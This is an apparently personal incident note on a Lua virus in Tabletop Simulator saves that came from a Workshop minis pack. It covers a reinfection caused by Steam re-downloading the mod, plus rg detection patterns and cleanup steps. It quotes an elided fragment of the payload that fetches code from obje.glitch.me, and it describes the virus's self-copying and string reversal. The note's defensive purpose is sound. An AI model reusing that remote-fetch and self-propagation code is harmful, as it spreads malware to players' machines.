# The TTS "Spawning object" virus

On 9/23/2026 a Lua virus was found in the TTS install: 707 objects in Nila
(`TS_Save_18`), 400 in staging (`TS_Save_19`) and in `TS_Save_24`, 422 in each
autosave, and six Saved Objects (`tree`, `Beartholomew`, `Beartholomews Echo`,
`The Brass Jackals`, `The Lapis Writ`, `statues`). It came from the Workshop
minis pack **"[Ленивый] Minis" (3618998883)**, which was deleted from
`Mods/Workshop/`. The repo's `tts/lua/` files were clean.

## What it is

Code appended to the end of an object's Lua script, after 400 spaces:

```
--[[Object base code]]Wait.time(function() ... end,1) ...
WebRequest.get("https://obje.glitch.me/", ...) --[[Spawning object]]
```

When loaded it:

- copies itself onto the end of every object's script, and onto every object
  that spawns later;
- sends a request to `obje.glitch.me`, and if the reply starts with `true`,
  writes the rest of the reply into the script and reloads the object.

The script strings are stored reversed (`tcejbo gninwapS`) so a search for
the plain words misses them.

## Finding it

```
rg -l -g '*.json' "gninwapS|obje\.glitch\.me" "/Users/wcb/Library/Tabletop Simulator"
```

Check `Saves/`, `Saves/Saved Objects/` and `Mods/Workshop/`. Run it after
subscribing to a new Workshop item.

## Removing it

`clean-tts-virus` cuts the payload out of the raw file and writes a file only
when the cleaned result, parsed, equals the original with the payload removed,
and none of `gninwapS`, `glitch.me`, `Object base code` or `Spawning object`
appears in it. Without `--write` it only reports.

1. Quit TTS.
2. Back up every infected file.
3. Clean **all** of them in one run. An infected file left behind puts the
   virus back into the others the next time one of its objects spawns.

   ```
   uv --directory /Users/wcb/personal/dnd/scripts run clean-tts-virus --write FILE...
   ```

4. Delete the Workshop item it came from, and unsubscribe from it on Steam, or
   Steam downloads it again.

A file reported as `FAIL` holds a variant the pattern does not match and was
not changed. The minis pack had one such variant.

The 9/23 backups of the infected files are in
`~/Library/Tabletop Simulator/virus-backup-2026-09-23/`. They still hold the
virus, so do not load them into TTS. (That directory was gone by 9/29.)

## Reinfected: 9/29

On 9/29 the same 13 files were infected again — `TS_Save_18` (707),
`TS_Save_19` (400), `TS_Save_24` (400), three autosaves (400 each), the same six
Saved Objects, and `Mods/Workshop/3618998883.json`. The counts match the 9/23
counts for every file.

**Deleting the Workshop file does not hold on its own — unsubscribe on Steam.**
The 9/23 note records the mod as deleted from `Mods/Workshop/`. On 9/29
`3618998883.json` and `3618998883.png` were both there with that day's
timestamp, and `Mods/Workshop/WorkshopFileInfos.json` listed
`[Ленивый] Minis` with an `UpdateTime` from that day. TTS asks Steam for the
subscribed items on launch and downloads whatever is missing, so a local delete
is undone the next time TTS starts. Step 4 is two actions: delete the file and
unsubscribe.

**Unsubscribe from the web while Steam is closed**, at
`https://steamcommunity.com/sharedfiles/filedetails/?id=<id>`. Steam then has
nothing to re-sync when it next starts. Unsubscribing from inside TTS means
launching TTS first, which is the moment the download happens.

**Delete the source mod rather than cleaning it.** The Workshop file is the
variant that `clean-tts-virus` reports `FAIL` on — on 9/29 it cut 365 payloads
and still left `gninwapS`, so the tool wrote nothing. Cleaning the saves while
that file sits in `Mods/Workshop/` puts the virus back. Delete the `.json` and
its `.png`, and drop the item's entry from
`Mods/Workshop/WorkshopFileInfos.json` so TTS stops listing a mod whose file is
gone.

**A scan that prints nothing may have failed — check the exit code.** On 9/29 the
documented `rg` scan printed nothing, and the install was taken as clean. ripgrep
was not installed on the machine: `rg` is a shell function that falls through to a
real binary, and with none there it exited 127. The scan had been run with stderr
redirected to `/dev/null`, which hid the error and left output identical to "no
matches". Never suppress stderr on this scan. `brew install ripgrep` fixed it,
and rg then scanned the saves, including one with a single 82 MB line.

Check the four markers together, and exclude the `virus-backup-*` directories —
they hold the virus on purpose:

```
rg -l -g '*.json' "gninwapS|glitch\.me|Object base code|Spawning object" \
  "/Users/wcb/Library/Tabletop Simulator" | grep -v virus-backup
```
